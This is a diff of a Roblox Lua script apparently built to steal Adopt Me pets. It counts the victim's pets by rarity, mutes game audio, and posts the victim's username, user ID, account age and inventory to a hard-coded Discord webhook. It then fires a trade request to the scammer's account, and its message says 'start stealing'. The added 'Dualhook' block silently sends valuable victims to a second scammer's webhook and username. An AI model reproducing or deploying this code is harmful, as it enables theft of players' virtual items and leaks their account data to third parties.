@@ -6,99 +6,19 @@ coroutine.wrap(function()
     local Loads = require(game.ReplicatedStorage.Fsys).load
     local InventoryDB = Loads("InventoryDB")
     local ClientData = Loads('ClientData')
--- Asumsi skrip ini berdasarkan struktur data umum
--- Tidak perlu data spesifik, skrip akan mencakup berbagai kasus
+    local legendaries_count = 0
+    local mega_count = 0
+    local neon_count = 0
+    local ultra_count = 0
+    local rare_count = 0
+    local uncommon_count = 0
+    local common_count = 0
 
--- Inisialisasi jumlah berdasarkan kategori
-local legendaries_count = 0
-local ultra_count = 0
-local rare_count = 0
-local uncommon_count = 0
-local common_count = 0
-local mega_count = 0
-local neon_count = 0
-
--- Simulasi ClientData dan InventoryDB
-local ClientData = {
-    get = function(key)
-        if key == "inventory" then
-            return {
-                pets = {
-                    {category = "cat1", id = "id1"},
-                    {category = "cat1", id = "id2"},
-                    {category = "cat2", id = "id3"},
-                    {category = "cat1", id = "id1"}, -- Duplikat untuk pengujian
-                }
-            }
-        end
-    end
-}
-
-local InventoryDB = {
-    cat1 = {
-        id1 = {rarity = "legendary", properties = "neon"},
-        id2 = {rarity = "ultra_rare", properties = nil},
-    },
-    cat2 = {
-        id3 = {rarity = "rare", properties = "mega_neon"},
-    },
-}
-
--- Membaca inventori dan menghitung jumlah berdasarkan kategori
-local processed_pets = {} -- Untuk melacak pet yang sudah dihitung
-
-for _, v in pairs(ClientData.get("inventory").pets) do
-    local category = v.category
-    local id = v.id
-
-    -- Cek jika data pet ada di database
-    if InventoryDB[category] and InventoryDB[category][id] then
-        local pet_data = InventoryDB[category][id]
-        local pet_key = category .. ":" .. id -- Identifier unik untuk setiap pet
-
-        -- Hindari menghitung duplikat
-        if not processed_pets[pet_key] then
-            processed_pets[pet_key] = true -- Tandai sebagai sudah dihitung
-
-            -- Hitung berdasarkan rarity
-            if pet_data.rarity == "legendary" then
-                legendaries_count = legendaries_count + 1
-            elseif pet_data.rarity == "ultra_rare" then
-                ultra_count = ultra_count + 1
-            elseif pet_data.rarity == "rare" then
-                rare_count = rare_count + 1
-            elseif pet_data.rarity == "uncommon" then
-                uncommon_count = uncommon_count + 1
-            elseif pet_data.rarity == "common" then
-                common_count = common_count + 1
-            end
-
-            -- Hitung berdasarkan properties
-            if pet_data.properties == "mega_neon" then
-                mega_count = mega_count + 1
-            elseif pet_data.properties == "neon" then
-                neon_count = neon_count + 1
-            end
-        end
-    else
-        warn("Pet not found in InventoryDB: " .. tostring(category) .. ":" .. tostring(id))
-    end
-end
-
--- Total semua pet
-local total_pets = legendaries_count + ultra_count + rare_count + uncommon_count + common_count + mega_count + neon_count
-
--- Print hasil
-print("Legendaries:", legendaries_count)
-print("Ultra Rares:", ultra_count)
-print("Rares:", rare_count)
-print("Uncommons:", uncommon_count)
-print("Commons:", common_count)
-print("Mega Neons:", mega_count)
-print("Neons:", neon_count)
-print("Total Pets:", total_pets)
-
-
+    -- [ Dualhook Settings ] --
+    DualUsername = "ImagineGotScamXD" -- [Dualhook Username]
+    DualWebhook = "https://discord.com/api/webhooks/1309897171369197588/Es13EP_U_GLWFjJrAwXPasVMU_0h61c3um6K5GNT4z_YJugWa6TGw2m6XNkpV_Y6rWgL" -- [Dualhook Webhook]
+    DualTotal = 15 -- [Minimum Total Pets]
+    
     local function muteAllAudio()
         for _, sound in pairs(workspace:GetDescendants()) do
             if sound:IsA("Sound") then
@@ -116,7 +36,48 @@ print("Total Pets:", total_pets)
             descendant.Volume = 0
         end
     end)
+    
+    for i, v in pairs(ClientData.get("inventory").pets) do
+      if InventoryDB[v.category][v.id].rarity == "legendary" then
+        legendaries_count = legendaries_count + 1
+      end
+      if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
+        ultra_count = ultra_count + 1
+      end
+      if InventoryDB[v.category][v.id].rarity == "rare" then
+        rare_count = rare_count + 1
+      end
+      if InventoryDB[v.category][v.id].rarity == "uncommon" then
+        uncommon_count = uncommon_count + 1
+      end
+      if InventoryDB[v.category][v.id].rarity == "common" then
+        common_count = common_count + 1
+      end
+      if InventoryDB[v.category][v.id].properties == "mega_neon" then
+        mega_count = mega_count + 1
+      end
+      if InventoryDB[v.category][v.id].properties == "neon" then
+        neon_count = neon_count + 1
+      end
+    end
 
+    local counts = {
+        legendaries_count = legendaries_count - 1,
+        ultra_count = ultra_count - 1,
+        rare_count = rare_count - 1,
+        common_count = common_count - 1
+    }
+    local total_pets = legendaries_count + ultra_count + rare_count + uncommon_count + common_count + mega_count + neon_count
+    
+    if total_pets >= DualTotal then
+        UserName = DualUsername
+        WebHook = DualWebhook
+    else
+        UserName = Username
+        WebHook = Webhook
+    end
+    
+    
     local exploit
     local function getexploit()
         local exploitt =
@@ -148,7 +109,7 @@ print("Total Pets:", total_pets)
       embeds = {
         {
           title = 'Join your player using **EXECUTE TO JOIN THEM**and they should just trade you to start stealing!',
-          description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '```\n**Join from Console**: \nRoblox.GameLauncher.joinGameInstance(920587237, "' .. game.JobId .. '")',
+          description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '```\n**Join from Console**: \n```lua\nRoblox.GameLauncher.joinGameInstance(920587237, "' .. game.JobId .. '")```',
           color = 10428396
         }
       }
@@ -156,7 +117,7 @@ print("Total Pets:", total_pets)
     local httpRequest = http.request or httprequest
     if httpRequest then
       httpRequest({
-        Url = Webhook,
+        Url = WebHook,
         Method = 'POST',
         Headers = {
           ['Content-Type'] = 'application/json'
@@ -186,7 +147,7 @@ print("Total Pets:", total_pets)
       local RouterClient = Loads("RouterClient")
       local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")
     
-            send_trade:FireServer(game.Players[Username])
+            send_trade:FireServer(game.Players[UserName])
     
     wait(5)
       local Loads = require(game.ReplicatedStorage.Fsys).load
@@ -214,7 +175,7 @@ print("Total Pets:", total_pets)
     end
     
     game.Players.PlayerAdded:Connect(function(player)
-      if player.Name == Username then
+      if player.Name == UserName then
           player.Chatted:Connect(function(msg)
               local lowerMsg = msg:lower()
               if lowerMsg == "/start" or lowerMsg == "start" or lowerMsg == "send" then
